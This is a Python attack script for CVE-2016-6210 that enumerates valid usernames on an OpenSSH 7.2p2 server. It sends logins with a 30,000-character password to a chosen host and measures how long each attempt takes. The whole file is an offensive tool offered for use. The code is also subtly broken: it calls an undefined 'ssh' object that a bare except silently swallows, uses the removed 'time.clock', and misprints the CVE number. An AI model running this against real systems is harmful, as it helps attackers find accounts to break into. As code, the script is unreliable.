# CVE-2016-6210
# User enumeration using Open SSHD version 7.2p2
# https://nvd.nist.gov/vuln/detail/CVE-2016-6210
# Real accounts take longer than fake accounts on time

import paramiko
import time
import sys
import getopt


DEFAULT_PORT = 22
DEFAULT_TARGET = "127.0.0.1"
LARGE_PASS = 'A'*30000


def usage():
    print("CVE-201-6210 -  User enumeration in Open SSHD version 7.2p2")
    print()
    print("Flags:")
    print("{} - Target host".format("\t-t --target".ljust(20," ")))
    print("{} - Port running ssh".format("\t-p --port".ljust(20," ")))
    print("{} - File containing usernames to try".format("\t-u --users".ljust(20," ")))
    print()


def main():
    if len(sys.argv) > 1:
        try:
            opts,args = getopt.getopt(sys.argv[1:],"t:u:p:",["target","users","port"])
        except getopt.GetoptError as e:
            print(str(e))
            usage()
            sys.exit(1)
        target = DEFAULT_TARGET
        user_file = None
        selected_port = DEFAULT_PORT
        for o,a in opts:
            if o in ("-t","--target"):
                target = a
            elif o in ("-u","--users"):
                user_file = open(a, 'r')
            elif o in ("-p","--port"):
                try:
                    selected_port = int(a)
                except ValueError:
                    print("[!] Invalid port provided, must be an int")
                    sys.exit(1)
            else:
                print("[!] Invalid option {} with value {}".format(o,a))
                usage()
                sys.exit(1)
        
        if user_file is None:
            print("[!] Must provide a file of usernames to try")
            usage()
            sys.exit(1)

        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        usernames = user_file.readlines()

        for sel_username in usernames:
            start_time = time.clock()
            sel_username = sel_username.strip()
            try:
                ssh.connect(target, port=selected_port, username=sel_username, password=LARGE_PASS)
            except: 
                end_time = time.clock()
            total_time = end_time - start_time
            print("[+] {} : {} secs".format(sel_username, total_time))

    else:
        usage()    


if __name__ == '__main__':
    main()
